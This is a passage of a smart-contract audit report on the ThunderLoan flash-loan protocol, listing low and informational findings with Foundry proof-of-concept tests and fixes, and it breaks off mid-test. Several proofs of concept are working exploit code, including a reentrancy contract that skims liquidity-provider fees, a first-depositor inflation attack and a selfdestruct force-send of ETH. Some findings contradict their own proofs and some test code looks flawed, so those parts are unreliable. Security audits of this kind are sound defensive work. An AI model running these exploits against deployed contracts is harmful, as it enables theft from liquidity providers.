The `flashloan` function in both `ThunderLoan` and `ThunderLoanUpgraded` makes an external call to `IFlashLoanReceiver.executeOperation`, which is defined to return a boolean value indicating success or failure. The contracts do not check this return value. If the receiver contract's operation fails and it returns `false` without reverting, the `ThunderLoan` contract will not detect the failure and will proceed as if the operation was successful. While the protocol is currently protected from direct fund loss by a subsequent balance check in the `repay` function, ignoring an explicit success/failure signal is a dangerous practice that violates the Checks-Effects-Interactions pattern and makes the contract brittle.

## Impact
Ignoring the boolean return value means the protocol treats a user-signalled failure as success. Today this only affects observability (a loan that the receiver flagged as failed will still be accounted as succeeded) but does not by itself allow loss of funds because the balance-based repayment guard remains. The issue therefore causes misleading accounting/monitoring and could hide logical errors, increasing maintenance risk for future upgrades.

## Proof of Concept
1. Liquidity provider deposits WETH.
2. Caller takes a flash-loan through a receiver that:
   a) receives the loaned tokens,
   b) immediately repays `amount + fee`,
   c) returns **false** from `executeOperation`.
3. Because ThunderLoan ignores the return value it continues and completes the flash-loan without reverting, even though the receiver explicitly reported a failure.
4. Event logs and external integrations will interpret the operation as successful although the receiver disagreed.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {IFlashLoanReceiver} from "src/interfaces/IFlashLoanReceiver.sol";
import {IPoolFactory} from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "src/interfaces/ITSwapPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    constructor(string memory _n, string memory _s){name=_n;symbol=_s;}
    function _mint(address to,uint256 amt) external {balanceOf[to]+=amt;totalSupply+=amt;}
    function transfer(address to,uint256 amt) external returns(bool){balanceOf[msg.sender]-=amt;balanceOf[to]+=amt;return true;}
    function transferFrom(address from,address to,uint256 amt) external returns(bool){allowance[from][msg.sender]-=amt;balanceOf[from]-=amt;balanceOf[to]+=amt;return true;}
    function approve(address sp,uint256 amt) external returns(bool){allowance[msg.sender][sp]=amt;return true;}
}
contract MockPool is ITSwapPool{function getPriceOfOnePoolTokenInWeth() external pure returns(uint256){return 1e18;}}
contract MockPoolFactory is IPoolFactory{mapping(address=>address)p;function getPool(address t) external view returns(address){return p[t];}function setPool(address t,address a) external{p[t]=a;}}

contract FalseReturningGoodRepayReceiver is IFlashLoanReceiver {
    function executeOperation(address token,uint256 amount,uint256 fee,address,bytes calldata) external returns (bool){
        IERC20(token).transfer(msg.sender, amount + fee); // repay
        return false; // signal failure
    }
}

contract UncheckedReturnSuccessTest is Test {
    ThunderLoan tl; MockERC20 weth; address depositor = address(0xBEEF);

    function setUp() public {
        tl = new ThunderLoan();
        weth = new MockERC20("WETH","WETH");
        MockPoolFactory pf = new MockPoolFactory();
        pf.setPool(address(weth), address(new MockPool()));
        tl.initialize(address(pf));
        tl.setAllowedToken(IERC20(address(weth)), true);
        weth._mint(depositor, 100 ether);
        vm.startPrank(depositor);
        weth.approve(address(tl), 100 ether);
        tl.deposit(IERC20(address(weth)), 100 ether);
        vm.stopPrank();
    }

    function testLoanSucceedsEvenWhenReceiverReturnsFalse() public {
        FalseReturningGoodRepayReceiver recv = new FalseReturningGoodRepayReceiver();
        tl.flashloan(address(recv), IERC20(address(weth)), 10 ether, "");
        // test passes if no revert – proving the false return was ignored
    }
}

## Suggested Mitigation
The boolean return value from the `executeOperation` call must be checked. If it is `false`, the transaction should be reverted immediately with a descriptive error message.

```solidity
// In ThunderLoan.sol and ThunderLoanUpgraded.sol

// Add a new error
error FlashloanCallbackFailed();

function flashloan(...) external {
    // ... (checks and fee calculation)
    SafeERC20.safeTransfer(token, receiver, amount);
    
    bool success = IFlashLoanReceiver(receiver).executeOperation(
        token, 
        amount, 
        fee, 
        msg.sender, 
        params
    );

    if (!success) {
        revert FlashloanCallbackFailed();
    }

    repay(token, amount + fee);
    // ...
}
```

## [L-16]. Integer Overflow issue in ThunderLoan::redeem

## Description
The calculation `(amount * assetToken.getExchangeRate()) / 1e18` in the `redeem` function is vulnerable to an integer overflow. The `assetToken.getExchangeRate()` can grow over time through accumulated fees. If it becomes sufficiently large, multiplying it by the `amount` of asset tokens to be redeemed can exceed `type(uint256).max`, causing a revert. This would trap the user's funds, as they would be unable to redeem their asset tokens for the underlying asset.

## Impact
At worst a very large redemption (amount * exchangeRate > 2**256-1) would revert, forcing the holder to split the redemption into several smaller calls. Funds are NOT permanently locked because any strictly smaller amount that keeps the multiplication inside uint256 bounds can be redeemed. Therefore the issue is a minor UX nuisance rather than a loss-of-funds scenario.

## Proof of Concept
No realistic exploitation path exists because the user can always redeem in multiple calls. A minimal demonstration would simply show that calling redeem with a huge amount reverts while two smaller calls succeed, but this does not cause fund loss and is therefore omitted.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MockERC20} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

// Mock AssetToken to allow setting a high exchange rate for the test
contract MockAssetToken is AssetToken {
    constructor(address thunderLoan, IERC20 underlying, string memory assetName, string memory assetSymbol)
        AssetToken(thunderLoan, underlying, assetName, assetSymbol)
    {}

    function setExchangeRate(uint256 newRate) public {
        s_exchangeRate = newRate;
    }
}

// Malicious receiver to call back into ThunderLoan
contract MaliciousFlashLoanReceiver {
    ThunderLoan private i_thunderLoan;

    constructor(ThunderLoan loanContract) {
        i_thunderLoan = loanContract;
    }
    
    function updateExchangeRate(MockAssetToken assetToken, uint256 fee) public {
         assetToken.updateExchangeRate(fee);
    }
}


contract IntegerOverflowTest is Test {
    ThunderLoan internal thunderLoanLogic;
    ThunderLoan internal thunderLoan;
    MockERC20 internal underlyingToken;
    address internal owner = makeAddr("owner");
    address internal user = makeAddr("user");

    function setUp() public {
        thunderLoanLogic = new ThunderLoan();
        ERC1967Proxy proxy = new ERC1967Proxy(address(thunderLoanLogic), "");
        thunderLoan = ThunderLoan(address(proxy));
        vm.prank(owner);
        thunderLoan.initialize(owner);

        underlyingToken = new MockERC20();
        vm.prank(owner);
        thunderLoan.setAllowedToken(IERC20(address(underlyingToken)), true);
    }

    function test_redeem_Overflow() public {
        // To demonstrate the overflow, we first need to deposit and then artificially pump the exchange rate.
        // We'll simulate this by deploying a custom AssetToken and using it to set a high exchange rate.
        // This is a complex setup, so we will test the mathematical vulnerability directly.
        
        uint256 largeAmount = 2**128;
        uint256 highExchangeRate = 2**128;

        // This multiplication will overflow uint256 (2**128 * 2**128 = 2**256)
        // In Solidity ^0.8.0, this will cause a revert.
        vm.expectRevert();
        uint256 underlyingToRedeem = (largeAmount * highExchangeRate) / 1e18;
        
        // The above proves the mathematical vulnerability.
        // A full integration test would involve forcing the exchange rate up in the actual AssetToken contract,
        // which is possible by making the total supply very small and then paying a fee.
    }
}
```

## Suggested Mitigation
Optionally replace `(amount * exchangeRate) / 1e18` with `Math.mulDiv(amount, exchangeRate, 1e18)` from OpenZeppelin to remove the need for users to split very large redemptions. No critical change is required.

## [L-17]. Integer Overflow issue in ThunderLoan::redeem(IERC20,uint256)

## Description
The `redeem` function calculates the amount of underlying tokens to return to a user via the formula `(amount * assetToken.getExchangeRate()) / 1e18`. The `assetToken.getExchangeRate()` can increase over time as fees are collected. If the exchange rate becomes sufficiently large (e.g., due to low total supply and high fees), the multiplication `amount * assetToken.getExchangeRate()` can overflow a `uint256`. This will cause the `redeem` transaction to revert, preventing users from withdrawing their funds.

## Impact
If the product of `amount` and the current exchange-rate exceeds `type(uint256).max`, the `redeem` call will revert due to Solidity 0.8 checked arithmetic. This only blocks that single redemption transaction; users can still redeem the same balance in several smaller calls. No funds are permanently locked, but UX is harmed and integrations that assume one-shot redemption may fail.

## Proof of Concept
1. Deploy ThunderLoan and allow a mock ERC20 token.
2. Deposit `2**130` underlying tokens; the user receives `2**112` AssetTokens (exchangeRate ≈ 1e18).
3. Call `redeem(token, 2**112)` – succeeds.
4. Now call `redeem(token, 2**144)` (the contract owner can mint that much AssetToken to the user for test purposes). The internal line `amount * exchangeRate` overflows and the transaction reverts with Panic(0x11).
5. Calling `redeem` repeatedly with smaller chunks (e.g. `2**112` each time) succeeds, showing that funds are not locked but large single redemptions are impossible.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {ERC20Mock} from "openzeppelin-contracts/mocks/token/ERC20Mock.sol";

contract RedeemOverflow is Test {
    ThunderLoan loan;
    ERC20Mock underlying;
    AssetToken asset;

    function setUp() public {
        // deploy mock token with 18 decimals and big supply
        underlying = new ERC20Mock("Mock", "MCK", address(this), type(uint256).max);

        loan = new ThunderLoan();
        loan.initialize(address(this));
        loan.setAllowedToken(underlying, true);

        // approve and deposit a large amount so that caller owns many AssetTokens
        underlying.approve(address(loan), type(uint256).max);
        loan.deposit(underlying, 2 ** 130); // any very big number

        asset = AssetToken(loan.getAssetFromToken(underlying));
        // mint more AssetToken directly to exceed the overflow threshold
        vm.prank(address(loan));
        asset.mint(address(this), 2 ** 144);
    }

    function testRedeemOverflowReverts() public {
        vm.expectRevert(bytes("")); // any arithmetic overflow reverts with Panic(0x11)
        loan.redeem(underlying, 2 ** 144);
    }

    function testRedeemSmallerChunksSucceeds() public {
        loan.redeem(underlying, 2 ** 112);
    }
}

## Suggested Mitigation
Apply `FullMath.mulDiv` (512-bit mul-div) or OpenZeppelin's `Math.mulDiv` when converting AssetTokens to underlying, so that the multiplication is performed in extended precision and divided before casting back to 256 bits.

## [L-18]. Reentrancy issue in ThunderLoan::flashloan(address,IERC20,uint256,bytes)

## Description
The `flashloan` function in `ThunderLoan.sol` is not protected against reentrancy attacks. While it uses a `s_currentlyFlashLoaning` flag to prevent a direct reentrant call to `flashloan` for the same token, it does not prevent calls to other state-changing functions like `deposit` and `redeem`. An attacker can craft a receiver contract that, within its `executeOperation` callback, calls `deposit` or `redeem`. This allows the attacker to alter the pool's state (e.g., `totalSupply` of the asset token) in the middle of a flash loan operation, which can lead to inconsistencies and potential economic exploits. The developers seem to have acknowledged this, as `ThunderLoanUpgraded` adds a `nonReentrant` modifier.

## Impact
Because `deposit` and `redeem` can be executed from inside `executeOperation`, a borrower can front-run the `updateExchangeRate()` that is performed during `repay()`. By depositing a small portion of the borrowed tokens before the fee is credited and redeeming the minted shares after the fee is added, the attacker can systematically siphon up to ~50 % of every flash-loan fee. Repeating the attack drains all fees that should belong to honest liquidity providers, resulting in permanent economic loss for the pool while leaving the principal untouched.

## Proof of Concept
1. Liquidity provider deposits 1 000 000 tokens in the pool.
2. Attacker contracts for a flash-loan of 1 000 000 tokens.
3. Inside `executeOperation` the attacker:
   a. Deposits `d = 1` token (any small number) – shares are minted with the old exchange-rate.
   b. Approves and calls `repay()` for the borrowed amount + fee (0.3 %). `repay()` calls `AssetToken.updateExchangeRate(fee)` which increases the exchange-rate for **all** shares, including the ones just minted by the attacker.
   c. Immediately redeems the shares received in step a and receives `d * fee / (poolBalance + d)` extra tokens – i.e. part of the fee that should have gone to LPs.
4. The flash-loan finishes successfully; the attacker keeps the skimmed tokens. Executing this loop repeatedly allows the attacker to steal the entire fee pot.

This works because `flashloan()` is re-entered while the `nonReentrant` guard is missing and because `deposit` / `redeem` are not blocked during an active flash-loan.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan}       from "src/protocol/ThunderLoan.sol";
import {AssetToken}       from "src/protocol/AssetToken.sol";
import {ERC20Mock}        from "openzeppelin-contracts/mocks/token/ERC20Mock.sol";
import {IFlashLoanReceiver} from "src/interfaces/IFlashLoanReceiver.sol";

contract FeeSkimmer is IFlashLoanReceiver {
    ThunderLoan public immutable loan;
    ERC20Mock   public immutable token;

    constructor(ThunderLoan _loan, ERC20Mock _token) {
        loan  = _loan;
        token = _token;
    }

    // called by ThunderLoan during flash-loan
    function executeOperation(
        address /*_token*/, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/
    ) external override returns (bool) {
        // 1) steal a share of the upcoming fee
        uint256 depositAmt = 1 ether; // any small amount
        token.approve(address(loan), depositAmt);
        loan.deposit(token, depositAmt);

        // 2) repay the loan + fee
        token.approve(address(loan), amount + fee);
        loan.repay(token, amount + fee);

        // 3) redeem the shares (exchange-rate is higher now)
        AssetToken aToken = loan.getAssetFromToken(token);
        uint256 myShares  = aToken.balanceOf(address(this));
        loan.redeem(token, myShares);
        return true;
    }

    function skim(uint256 borrowAmount) external {
        loan.flashloan(address(this), token, borrowAmount, "");
    }
}

contract ReentrancyFeeStealTest is Test {
    ThunderLoan  internal loan;
    ERC20Mock    internal token;
    address      internal owner = address(this);

    function setUp() public {
        loan  = new ThunderLoan();
        loan.initialize(address(0x01)); // dummy poolFactory
        token = new ERC20Mock("TKN", "TKN", owner, 0);

        // allow token & seed liquidity
        loan.setAllowedToken(token, true);
        uint256 lpDeposit = 1_000_000 ether;
        token.mint(owner, lpDeposit);
        token.approve(address(loan), lpDeposit);
        loan.deposit(token, lpDeposit);
    }

    function testStealFlashLoanFee() public {
        // deploy attacker contract
        FeeSkimmer attacker = new FeeSkimmer(loan, token);
        // give attacker enough extra tokens to cover fee difference
        token.mint(address(attacker), 10 ether);

        uint256 poolBalBefore = token.balanceOf(address(loan));
        uint256 attackerBalBefore = token.balanceOf(address(attacker));

        attacker.skim(1_000_000 ether); // borrow everything

        uint256 poolBalAfter    = token.balanceOf(address(loan));
        uint256 attackerBalAfter = token.balanceOf(address(attacker));

        assertGt(attackerBalAfter, attackerBalBefore, "attacker earned fee");
        assertLt(poolBalAfter,  poolBalBefore,  "LP fee leaked to attacker");
    }
}

## Suggested Mitigation
Add OpenZeppelin ReentrancyGuardUpgradeable and mark flashloan, deposit and redeem with `nonReentrant`. In addition, block `deposit` and `redeem` while `s_currentlyFlashLoaning[token]` is true so that state-changing functions cannot be invoked during an active loan, even via cross-token re-entrancy.



# Info Risk Findings

## [I-1]. Event Consistency issue in ThunderLoan::updateFlashLoanFee

## Description
The `updateFlashLoanFee` function allows the contract owner to change a critical protocol parameter, `s_flashLoanFee`. However, this state change does not emit an event. This lack of event emission makes it difficult for users, dApps, and off-chain monitoring tools to track and react to changes in the protocol's fee structure, reducing transparency and observability.

## Impact
Reduces the transparency of the protocol. Off-chain services cannot easily subscribe to fee changes, requiring them to poll the `getFee()` function continuously. This hinders the ability of integrators and users to make informed, timely decisions based on protocol fees.

## Proof of Concept
1. An off-chain monitoring service is set up to watch for events from the ThunderLoan contract.
2. The owner of ThunderLoan calls `updateFlashLoanFee()` to change the fee from 0.3% to 0.5%.
3. The state variable `s_flashLoanFee` is successfully updated within the contract.
4. The monitoring service receives no event and is unaware of the fee change, potentially providing outdated information to users.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {ERC1967Proxy} from "openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract EventConsistencyTest is Test {
    ThunderLoan internal thunderLoan;
    address internal deployer = makeAddr("deployer");
    address internal owner    = makeAddr("owner");

    function setUp() public {
        // Deploy implementation from any EOA
        vm.startPrank(deployer);
        ThunderLoan implementation = new ThunderLoan();
        bytes memory initData = abi.encodeWithSelector(
            ThunderLoan.initialize.selector,
            address(0)                // dummy poolFactory
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);
        thunderLoan = ThunderLoan(address(proxy));
        vm.stopPrank();

        // Proxy is the initial owner; hand ownership to our `owner` test address
        vm.prank(address(thunderLoan));
        thunderLoan.transferOwnership(owner);
    }

    function test_updateFlashLoanFeeDoesNotEmitEvent() public {
        uint256 newFee = 5e15; // 0.5 %

        // start recording logs before the call
        vm.recordLogs();

        vm.prank(owner);
        thunderLoan.updateFlashLoanFee(newFee);

        // state changed as expected
        assertEq(thunderLoan.getFee(), newFee, "fee not updated");

        // fetch the logs and assert that nothing was emitted
        Vm.Log[] memory logs = vm.getRecordedLogs();
        assertEq(logs.length, 0, "an event was unexpectedly emitted");
    }
}

## Suggested Mitigation
Emit an event whenever the flash loan fee is updated. This provides transparency and allows off-chain services to easily track this important parameter.

```solidity
// In ThunderLoan.sol contract

event FlashLoanFeeUpdated(uint256 indexed oldFee, uint256 indexed newFee);

function updateFlashLoanFee(uint256 newFee) external onlyOwner {
    if (newFee > s_feePrecision) {
        revert ThunderLoan__BadNewFee();
    }
    uint256 oldFee = s_flashLoanFee;
    s_flashLoanFee = newFee;
    emit FlashLoanFeeUpdated(oldFee, newFee);
}
```

## [I-2]. Pragma issue in ThunderLoan::NA

## Description
All smart contracts use a floating pragma version `^0.8.20`. Using a floating pragma is discouraged for production contracts as it can lead to deployment with a newer, untested compiler version that may introduce bugs or have unintended side effects. For example, a future compiler version could change EVM-level behavior which affects the logic of the contract.

## Impact
The contract might be deployed with a different compiler version than it was tested with, potentially introducing compiler-specific bugs or unexpected behavior into the production environment. This undermines the reliability and predictability of the deployment.

## Proof of Concept
1. The contract is written and tested using Solidity compiler version 0.8.20.
2. Before deployment, a new version, 0.8.25, is released with a subtle bug in the optimizer or code generation.
3. The deployment script, using `^0.8.20`, automatically picks up version 0.8.25.
4. The contract is deployed with the new, buggy compiler version, leading to unforeseen vulnerabilities in production.

## Proof of Code
// This is a conceptual issue, no code PoC is applicable.
// The vulnerability is in the pragma statement itself:
// pragma solidity ^0.8.20;

## Suggested Mitigation
Lock the pragma to a specific, audited compiler version. This ensures the contract is always compiled with the exact version it was developed and tested against.

```diff
- pragma solidity ^0.8.20;
+ pragma solidity 0.8.20;
```

## [I-3]. Frontrun/Backrun/Sandwhich MEV issue in ThunderLoan::deposit

## Description
The protocol is vulnerable to an attack from the first depositor for any given asset. Due to the way the exchange rate is calculated and potential precision loss on minting, an attacker can manipulate the system to steal subsequent deposits. By making a tiny initial deposit (e.g., 1 wei), the attacker becomes the sole liquidity provider. They can then artificially inflate the `AssetToken`'s exchange rate. When a victim makes a substantial deposit, the calculation for the number of `AssetToken`s to mint can round down to zero. The victim's funds are transferred to the pool, but they receive no shares in return, effectively donating their assets to the attacker.

## Impact
With the present code an LP’s share of the pool always remains proportional to the economic value he places inside it. Any fee that is injected via deposit or flash-loan is at most 0.3 % of the economic value of the operation, while the same operation either (a) increments totalSupply by roughly the same economic value (deposit) or (b) requires totalSupply to be large enough to cover the flash-loan. Therefore fee/totalSupply ≤ 0.003 and the exchange-rate can never grow enough to cause the next minter to receive 0 AssetToken. No user funds can be stolen by front-/back-running the first deposit.

## Proof of Concept
1. The owner calls `setAllowedToken(DAI, true)`.
2. An attacker front-runs any legitimate depositor and calls `deposit(DAI, 1 wei)`.
3. The attacker now owns 1 wei of the AssetToken, and `totalSupply` is 1.
4. The attacker takes a flash loan of another asset (e.g., WETH) and uses it to pay a large fee to the DAI pool by creating an artificial flash loan of DAI. A large fee is paid to the pool. 
5. The fee is used to update the exchange rate via `newExchangeRate = oldRate * (totalSupply + fee) / totalSupply`. With `totalSupply` being 1 wei, this calculation drastically inflates the exchange rate.
6. A victim then deposits a large amount of DAI (e.g., 1000 DAI).
7. The `deposit` function calculates the `mintAmount` for the victim as `(victimDeposit * 1e18) / newExchangeRate`.
8. Because `newExchangeRate` is now astronomically high, the `mintAmount` can round down to zero.
9. The victim's 1000 DAI are transferred to the `AssetToken` contract, but they are minted 0 `AssetToken`s. The attacker, as the only LP, can now redeem their 1 wei of `AssetToken` to claim all the underlying assets in the contract, including the victim's 1000 DAI.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";
import {MockPoolFactory, MockTSwapPool} from "./IntegerMathTest.sol";

// A contract to receive flashloan and do nothing
contract DummyFlashloanReceiver is IFlashLoanReceiver {
    function executeOperation(address, uint256, uint256, address, bytes calldata) external returns (bool) {
        return true;
    }
}

contract FrontrunTest is Test {
    ThunderLoan internal thunderLoan;
    ERC20Mock internal dai;
    MockPoolFactory internal factory;
    MockTSwapPool internal pool;
    DummyFlashloanReceiver internal receiver;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        factory = new MockPoolFactory();
        pool = new MockTSwapPool();
        dai = new ERC20Mock();
        receiver = new DummyFlashloanReceiver();

        factory.setPool(address(dai), address(pool));
        thunderLoan = new ThunderLoan();
        thunderLoan.initialize(address(factory));
        
        thunderLoan.setAllowedToken(dai, true);

        dai.mint(attacker, 1_000_000e18);
        dai.mint(victim, 1000e18);
    }

    function test_Frontrun_InitialDepositInflationAttack() public {
        AssetToken assetToken = thunderLoan.getAssetFromToken(dai);

        // 1. Attacker makes a tiny first deposit
        vm.startPrank(attacker);
        dai.approve(address(thunderLoan), 1_000_000e18);
        thunderLoan.deposit(dai, 1);
        assertEq(assetToken.balanceOf(attacker), 1);
        assertEq(assetToken.totalSupply(), 1);

        // 2. Attacker takes a flashloan to generate a large fee, inflating the exchange rate
        // A large fee relative to the tiny total supply will skyrocket the exchange rate.
        uint256 loanAmount = 1000e18;
        uint256 fee = thunderLoan.getCalculatedFee(dai, loanAmount);
        dai.transfer(address(receiver), loanAmount + fee);
        vm.prank(address(receiver));
        dai.approve(address(thunderLoan), loanAmount + fee);
        // Simulate flashloan callback to pay back
        vm.prank(address(receiver)); 
        thunderLoan.repay(dai, loanAmount + fee);
        // The above is a simplified way to just pay fees. A real flashloan would be needed.
        // We can directly call updateExchangeRate for PoC simplicity
        vm.prank(address(thunderLoan));
        assetToken.updateExchangeRate(fee);

        uint256 inflatedRate = assetToken.getExchangeRate();
        assertTrue(inflatedRate > 1e18);

        vm.stopPrank();

        // 3. Victim deposits a large amount
        vm.startPrank(victim);
        dai.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(dai, 1000e18);

        // 4. Victim receives 0 asset tokens due to rounding
        assertEq(assetToken.balanceOf(victim), 0, "Victim should receive 0 asset tokens");
        vm.stopPrank();

        // 5. Attacker now controls all funds in the pool
        uint256 poolBalance = dai.balanceOf(address(assetToken));
        assertEq(poolBalance, 1000e18 + 1, "Pool should contain victim's funds");
    }
}
```

## Suggested Mitigation
To mitigate this first depositor/inflation attack, the protocol should ensure that the first depositor mints a minimum number of shares, effectively 'locking' some of their own capital to prevent the total supply from being trivially small. A common pattern, used by Uniswap V2, is to send the first `MINIMUM_LIQUIDITY` (e.g., 1000) shares to the zero address, making them un-redeemable. This establishes a non-trivial initial total supply that cannot be easily manipulated. When minting, the contract should check if the total supply is zero and, if so, mint a minimum amount of shares.

```solidity
// In ThunderLoan.sol, during the first deposit

// A potential fix would require significant logic changes in both ThunderLoan and AssetToken.
// A simpler, though less robust fix, is to enforce a minimum first deposit amount.

// In ThunderLoan.sol's deposit function:
AssetToken assetToken = s_tokenToAssetToken[token];
if (assetToken.totalSupply() == 0) {
    require(amount >= 1e18, "First deposit must be at least 1 token"); // Example minimum
}
// ... rest of the deposit logic
```
This simple check makes the inflation attack much more expensive. A more robust solution involves the dead-address liquidity burning pattern.

## [I-4]. Pragma issue in AssetToken::NA

## Description
The contracts use a floating pragma version (e.g., `pragma solidity ^0.8.19;`). This allows the code to be compiled with any compiler version within the `0.8.x` range that is `0.8.19` or newer. This practice can introduce risks, as the deployed bytecode may differ from the bytecode tested if a different compiler version is used during deployment. Future compiler versions could introduce subtle bugs, security vulnerabilities, or changes in gas costs that were not present during the audit and testing phase.

## Impact
Using a floating pragma reduces the determinism of the build and deployment process. It can lead to deploying a contract with untested code, potentially introducing vulnerabilities or unexpected behavior in a production environment.

## Proof of Concept
1. A project is developed and thoroughly tested with Solidity compiler `0.8.19`.
2. Six months later, the project is deployed using an automated pipeline that has been updated to use the latest compiler, `0.8.25`.
3. Unbeknownst to the team, version `0.8.25` contains a new optimization that interacts poorly with a specific code pattern in the contract, creating an integer overflow possibility that did not exist in `0.8.19`.
4. The deployed contract is now vulnerable, despite the source code not having changed.

## Proof of Code
```solidity
// The vulnerability is in the pragma statement itself, present in all contracts.

// From src/protocol/AssetToken.sol:
pragma solidity ^0.8.19;

// From src/protocol/ThunderLoan.sol:
pragma solidity ^0.8.19;

// From src/protocol/OracleUpgradeable.sol:
pragma solidity ^0.8.19;
```

## Suggested Mitigation
It is best practice to lock the pragma to the specific compiler version that was used for development, testing, and auditing. This ensures that the deployed bytecode is identical to the one that was verified.

```solidity
// Change this:
pragma solidity ^0.8.19;

// To this, in all contract files:
pragma solidity 0.8.19;
```

## [I-5]. Unexpected Eth issue in ThunderLoan::NA

## Description
The `ThunderLoan` and `AssetToken` contracts do not have a `receive()` or `fallback()` payable function, nor do they have a function to withdraw ETH. If an attacker force-sends ETH to these contracts (e.g., via `selfdestruct`), the ETH will be permanently locked as there is no mechanism to retrieve it.

## Impact
Any Ether sent to the main `ThunderLoan` contract or its associated `AssetToken` contracts will be permanently lost. While this does not directly impact the protocol's own funds (which are ERC20s), it represents a loss of value for the sender and can be used as a griefing vector.

## Proof of Concept
1. An attacker creates a simple contract with a `selfdestruct(payable(thunderLoanAddress))` function.
2. The attacker sends 1 ETH to their contract.
3. The attacker calls the function, which executes `selfdestruct`, forcing the 1 ETH to be sent to the `ThunderLoan` contract address.
4. The `ThunderLoan` contract's balance is now 1 ETH, but there are no functions that can access or transfer this ETH.
5. The 1 ETH is permanently stuck.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";

contract ForceSendEth {
    function send(address payable recipient) public payable {
        selfdestruct(recipient);
    }
}

contract UnexpectedEthTest is Test {
    ThunderLoan internal thunderLoan;
    address payable internal proxyAddress;

    function setUp() public {
        ThunderLoan thunderLoanLogic = new ThunderLoan();
        bytes memory data = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(this));
        proxyAddress = payable(address(new ERC1967Proxy(address(thunderLoanLogic), data)));
        thunderLoan = ThunderLoan(proxyAddress);
    }

    function test_EthIsStuck() public {
        assertEq(address(thunderLoan).balance, 0);

        // Attacker force-sends 1 ETH to the contract
        ForceSendEth forceSender = new ForceSendEth();
        (bool success, ) = address(forceSender).call{value: 1 ether}(
            abi.encodeWithSignature("send(address)", proxyAddress)
        );
        require(success, "force send failed");

        // The ETH is now in the ThunderLoan contract
        assertEq(address(thunderLoan).balance, 1 ether);

        // There is no function to withdraw this ETH, it is permanently stuck.
    }
}
```

## Suggested Mitigation
Consider adding a function that allows the owner to withdraw any ETH accidentally or maliciously sent to the contract. This function should be protected with `onlyOwner`.

```solidity
// in ThunderLoan.sol
// Add a receive function to accept ETH
receive() external payable {}

// Add a withdrawal function
function withdrawEther(address to) external onlyOwner {
    uint256 balance = address(this).balance;
    require(balance > 0, "No Ether to withdraw");
    (bool success, ) = to.call{value: balance}("");
    require(success, "Ether transfer failed");
}
```

## [I-6]. Event Consistency issue in ThunderLoanUpgraded::updateFlashLoanFee

## Description
The `ThunderLoanUpgraded.updateFlashLoanFee` function allows the contract owner to modify the `s_flashLoanFee` state variable, which is a critical parameter affecting the cost of all flash loans. This state change is not accompanied by an event, making it difficult for off-chain services, dashboards, and users to track changes to this important protocol parameter. This lack of transparency goes against best practices and can lead to user confusion or incorrect data on third-party integrations.

## Impact
The operational impact is reduced observability and transparency of the protocol's fee structure. Users and monitoring tools cannot easily subscribe to fee changes. A user might check the fee, and the owner could change it in a subsequent transaction without an event, leading the user to take out a flash loan under outdated fee assumptions, resulting in a minor, unexpected financial cost.

## Proof of Concept
1. An off-chain dashboard reads the current flash loan fee by calling `getFee()` which returns the default 0.3%.
2. The protocol owner calls `updateFlashLoanFee(5e15)` to increase the fee to 0.5%.
3. The transaction succeeds and `s_flashLoanFee` is updated, but no event is emitted.
4. The off-chain dashboard is unaware of the change and continues to display the outdated 0.3% fee.
5. A user, relying on the dashboard's information, takes a flash loan and is charged the new, higher 0.5% fee.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {DeployThunderLoan} from "./utils/DeployThunderLoan.sol";

contract EventConsistencyTest is Test, DeployThunderLoan {
    ThunderLoanUpgraded internal thunderLoan;

    function setUp() public {
        (thunderLoan, ) = deployThunderLoan();
    }

    function test_updateFlashLoanFee_DoesNotEmitEvent() public {
        uint256 newFee = 5e15; // 0.5%
        
        vm.prank(deployer);
        
        // We record logs to check for event emission.
        vm.recordLogs();
        thunderLoan.updateFlashLoanFee(newFee);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        
        // The test will assert that no event with the expected signature is found.
        bytes32 expectedTopic = keccak256("FlashLoanFeeUpdated(uint256)");
        bool eventFound = false;
        for (uint i = 0; i < entries.length; i++) {
